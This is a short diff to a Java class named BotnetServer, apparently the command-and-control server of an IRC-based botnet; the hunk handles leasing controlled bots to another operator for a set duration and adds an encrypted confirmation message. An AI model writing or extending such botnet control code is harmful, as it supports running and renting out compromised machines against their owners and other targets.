@@ -239,6 +239,8 @@ public class BotnetServer extends PircBot {
 					sendMessage(name, botKeys.get(name).encryptMsg(parts[0] + " " + leaseMaster + " " + duration + " " + leasedPubInfo));
 					System.out.println("\tLeased " + name + " to " + leaseMaster + " for " + duration);
 				}
+				chat.sendLine(m.encryptRSA("leased"));
+				chat.close();
 			} else {
 				System.out.println("Usage: lease leaseMaster duration bot [more bots]");
 			}
